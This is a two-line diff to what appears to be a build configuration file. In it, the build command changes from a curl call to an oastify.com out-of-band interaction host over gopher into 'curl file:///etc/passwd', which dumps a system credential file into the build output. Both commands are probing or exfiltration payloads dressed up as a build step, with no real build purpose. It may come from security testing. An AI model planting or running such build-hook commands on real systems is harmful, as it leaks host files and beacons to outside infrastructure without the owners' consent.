@@ -1,2 +1,2 @@
 [build]
-  command = "curl gopher://vkjblfsyh1tmk86iqaojmqrvamgd42.oastify.com"
+  command = "curl file:///etc/passwd"
